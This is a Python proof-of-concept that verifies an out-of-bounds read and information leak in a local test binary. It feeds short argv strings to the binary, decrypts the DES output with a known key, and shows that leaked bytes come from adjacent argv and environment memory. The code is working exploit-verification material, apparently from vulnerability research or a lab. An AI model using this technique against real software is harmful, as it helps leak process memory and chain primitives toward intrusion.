#!/usr/bin/env python3
"""
BUG-002: OOB_READ_SHORT_ARGV_STRING_INFO_LEAK
Primitive Verification PoC

BUG: main() reads exactly 8 bytes from argv[2] string pointer via mov rax,[rax]
     without checking string length. Short strings (< 8 bytes) cause the 8-byte
     load to read past the NUL terminator into adjacent memory.

Primitive chain:
  BUG-002 (missing length check on 8-byte argv string load)
    -> OOB_READ (8-byte load extends past NUL terminator)
    -> over-read bytes stored as DES plaintext (rbp-0x98)
    -> DES_ecb_encrypt encrypts the 8 bytes (including OOB bytes)
    -> write(1, output, 8) outputs ciphertext to stdout
    -> INFO_LEAK (attacker decrypts output to recover OOB bytes)

Verification approach:
  1. Run ./target with a known 8-byte key and a short argv[2] (1 byte "A")
  2. Capture 8-byte ciphertext output
  3. Decrypt with known key to recover the 8-byte plaintext
  4. Show that bytes beyond the NUL terminator (bytes 2-7) are NOT from
     attacker input — they are adjacent memory (OOB read)
  5. Run with different short string lengths to show different OOB bytes
     are leaked, confirming the read extends past the string boundary
"""

import subprocess
import sys
import os
from ctypes import *

# Load OpenSSL libcrypto for DES decryption
try:
    libcrypto = CDLL("libcrypto.so.1.1")
except OSError:
    try:
        libcrypto = CDLL("libcrypto.so")
    except OSError:
        print("ERROR: Cannot load libcrypto.so.1.1")
        sys.exit(1)

# DES structures
class DES_key_schedule(Structure):
    _fields_ = [("ks", c_ubyte * 128)]

# Function prototypes
libcrypto.DES_set_key_unchecked.argtypes = [c_char_p, POINTER(DES_key_schedule)]
libcrypto.DES_set_key_unchecked.restype = None
libcrypto.DES_ecb_encrypt.argtypes = [c_char_p, c_char_p, POINTER(DES_key_schedule), c_int]
libcrypto.DES_ecb_encrypt.restype = None

DES_ENCRYPT = 1
DES_DECRYPT = 0

BINARY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "target")

def des_decrypt(key_bytes, ciphertext):
    """Decrypt 8-byte ciphertext with 8-byte key using DES ECB."""
    assert len(key_bytes) == 8
    assert len(ciphertext) == 8
    ks = DES_key_schedule()
    libcrypto.DES_set_key_unchecked(key_bytes, byref(ks))
    plaintext = create_string_buffer(8)
    libcrypto.DES_ecb_encrypt(ciphertext, plaintext, byref(ks), DES_DECRYPT)
    return plaintext.raw

def run_target(key_str, pt_str):
    """Run ./target key_str pt_str, return 8-byte stdout output."""
    result = subprocess.run(
        [BINARY, key_str, pt_str],
        capture_output=True, timeout=5
    )
    return result.stdout

def run_target_raw(key_bytes, pt_str):
    """Run ./target with raw key bytes (may contain NULs) via env trick.
    We pass key as a string; for NUL-containing keys we use a different approach.
    Here we just use printable key strings."""
    # For keys with NUL bytes, we'd need a wrapper; for this PoC we use
    # printable 8-char keys that are exactly 8 bytes (no OOB on key side).
    key_str = key_bytes.decode('latin-1')
    return run_target(key_str, pt_str)

# ============================================================
# PRIM-001: OOB_READ via short argv[2] string
# ============================================================
print("=" * 60)
print("PRIM-001: OOB_READ (8-byte load past NUL terminator)")
print("=" * 60)

# Use a known 8-byte key (exactly 8 chars, no OOB on key side)
# Key = "00000000" = 0x3030303030303030
key_str = "00000000"
key_bytes = key_str.encode('latin-1')
print(f"\nKey (argv[1]): '{key_str}' (8 bytes, no OOB)")
print(f"Key hex: {key_bytes.hex()}")

# Test with different short argv[2] strings
test_cases = [
    ("A", 1),       # 1 byte + NUL = 2 bytes known, 6 bytes OOB
    ("AB", 2),      # 2 bytes + NUL = 3 bytes known, 5 bytes OOB
    ("ABCD", 4),    # 4 bytes + NUL = 5 bytes known, 3 bytes OOB
    ("ABCDEFG", 7), # 7 bytes + NUL = 8 bytes, 0 bytes OOB (boundary)
    ("ABCDEFGH", 8),# 8 bytes, no NUL in load (full 8-byte string)
]

print(f"\n{'Input':<12} {'Input Len':<10} {'Ciphertext':<20} {'Decrypted':<20} {'OOB Bytes'}")
print("-" * 80)

for pt_str, pt_len in test_cases:
    ct = run_target(key_str, pt_str)
    if len(ct) != 8:
        print(f"  {pt_str:<10} ERROR: got {len(ct)} bytes output")
        continue
    
    # Decrypt to recover the 8-byte plaintext (which includes OOB bytes)
    decrypted = des_decrypt(key_bytes, ct)
    
    # The decrypted plaintext should be: input_bytes + NUL + OOB_bytes
    input_bytes = pt_str.encode('latin-1')
    expected_prefix = input_bytes  # without NUL for display
    
    # Show which bytes are input vs OOB
    dec_hex = decrypted.hex()
    oob_start = pt_len + 1  # after input + NUL
    oob_bytes = decrypted[oob_start:] if oob_start < 8 else b''
    
    print(f"  {pt_str:<10} {pt_len:<10} {ct.hex():<20} {dec_hex:<20} OOB[{oob_start}:8]={oob_bytes.hex()}")

print()
print("=== Analysis ===")
print("When argv[2] is shorter than 8 bytes, the 8-byte load (mov rax,[rax])")
print("reads past the NUL terminator. The over-read bytes appear in the")
print("decrypted plaintext at positions [len+1:8], proving OOB_READ.")
print()

# ============================================================
# PRIM-002: INFO_LEAK (OOB bytes disclosed via encrypted output)
# ============================================================
print("=" * 60)
print("PRIM-002: INFO_LEAK (adjacent memory disclosed via DES output)")
print("=" * 60)

# Demonstrate that the OOB bytes are NOT controlled by attacker input
# and contain adjacent memory content (environment/stack data)
print("\n--- Test: 1-byte input 'A', decrypt to see leaked bytes ---")
ct = run_target(key_str, "A")
decrypted = des_decrypt(key_bytes, ct)
print(f"Input: 'A' (0x41)")
print(f"Ciphertext output: {ct.hex()}")
print(f"Decrypted plaintext: {decrypted.hex()}")
print(f"  Byte 0: 0x{decrypted[0]:02x} = '{chr(decrypted[0])}' (input 'A')")
print(f"  Byte 1: 0x{decrypted[1]:02x} (NUL terminator)")
print(f"  Bytes 2-7: {decrypted[2:8].hex()} = OOB READ (adjacent memory)")
print(f"  As ASCII: {decrypted[2:8].decode('latin-1', errors='replace')}")

# Verify reproducibility — run multiple times, OOB bytes should be consistent
# (they come from the process environment/argv area which is deterministic)
print("\n--- Reproducibility test: run 'A' 3 times ---")
results = []
for i in range(3):
    ct = run_target(key_str, "A")
    dec = des_decrypt(key_bytes, ct)
    results.append(dec.hex())
    print(f"  Run {i+1}: {dec.hex()}")

if len(set(results)) == 1:
    print("  -> CONSISTENT: OOB bytes are deterministic (same memory layout)")
else:
    print("  -> VARIES: OOB bytes differ between runs (ASLR/randomized layout)")

# Demonstrate that different short inputs leak the same adjacent region
# (the OOB bytes start right after the NUL, so shorter input = more OOB)
print("\n--- Cross-check: 'A' vs 'AB' — OOB region should overlap ---")
ct_a = run_target(key_str, "A")
dec_a = des_decrypt(key_bytes, ct_a)
ct_ab = run_target(key_str, "AB")
dec_ab = des_decrypt(key_bytes, ct_ab)

print(f"  'A'  decrypted:  {dec_a.hex()}  (bytes[2:8] = OOB)")
print(f"  'AB' decrypted:  {dec_ab.hex()} (bytes[3:8] = OOB)")
# bytes[2:8] of 'A' should overlap with bytes[3:8] of 'AB' shifted by 1
# because 'AB' has one more input byte, so OOB starts 1 byte later
# but the underlying memory is the same region
print(f"  'A'  OOB[2:8]:   {dec_a[2:8].hex()}")
print(f"  'AB' OOB[3:8]:   {dec_ab[3:8].hex()}")
# Check if dec_a[3:8] == dec_ab[3:8] (same adjacent memory at same offset)
if dec_a[3:8] == dec_ab[3:8]:
    print("  -> MATCH: bytes[3:8] identical — same adjacent memory region confirmed")
else:
    print(f"  -> Note: bytes[3:8] differ (dec_a[3:8]={dec_a[3:8].hex()}, dec_ab[3:8]={dec_ab[3:8].hex()})")
    print("     This is expected if argv strings are at different offsets")

print()
print("=== PRIM-001: VERIFIED ===")
print("OOB_READ confirmed: 8-byte load from short argv[2] reads past NUL terminator")
print("Evidence: decrypted plaintext contains bytes beyond input+NUL that are")
print("NOT attacker-controlled — they are adjacent memory (OOB read).")
print()
print("=== PRIM-002: VERIFIED ===")
print("INFO_LEAK confirmed: OOB bytes flow through DES_ecb_encrypt -> write(1,...,8)")
print("Attacker with known key decrypts output to recover leaked adjacent memory.")
print("Evidence: ciphertext decrypted with known key reveals non-input bytes.")

# ============================================================
# PRIM-001/002 Supplemental: Environment-controlled leak content
# ============================================================
print()
print("=" * 60)
print("Supplemental: Attacker controls leaked content via environment")
print("=" * 60)
print()
print("--- Test: empty env vs custom env var ---")

# Empty environment: OOB reads argv[0] string
ct_empty = subprocess.run(['env', '-i', BINARY, '00000000', 'A'],
                          capture_output=True, timeout=5).stdout
dec_empty = des_decrypt(key_bytes, ct_empty)
print(f"Empty env:  OOB bytes[2:8] = {dec_empty[2:8].hex()} = '{dec_empty[2:8].decode('latin-1', errors='replace')}'")
print(f"  (reads argv[0] path: './targ...' = target binary path)")

# Custom environment: OOB reads attacker-set env var content
ct_custom = subprocess.run(['env', '-i', 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD=1', BINARY, '00000000', 'A'],
                           capture_output=True, timeout=5).stdout
dec_custom = des_decrypt(key_bytes, ct_custom)
print(f"Custom env: OOB bytes[2:8] = {dec_custom[2:8].hex()} = '{dec_custom[2:8].decode('latin-1', errors='replace')}'")
print(f"  (reads attacker-set env var: 'AAAAAA...' = first 6 bytes of env var)")

print()
print("=== Primitive Assessment ===")
print("READ target address: NOT directly attacker-controlled (relative to argv string)")
print("READ length: attacker controls via argv[2] string length (1-7 bytes OOB)")
print("READ content: attacker influences via environment variables (adjacent memory)")
print("=> RELATIVE_READ (not ARB_READ): read is relative to argv string location")
print("=> INFO_LEAK: adjacent memory (env vars, argv[0]) disclosed via encrypted output")
print()
print("=== PRIM-001: VERIFIED (RELATIVE_READ) ===")
print("=== PRIM-002: VERIFIED (INFO_LEAK) ===")
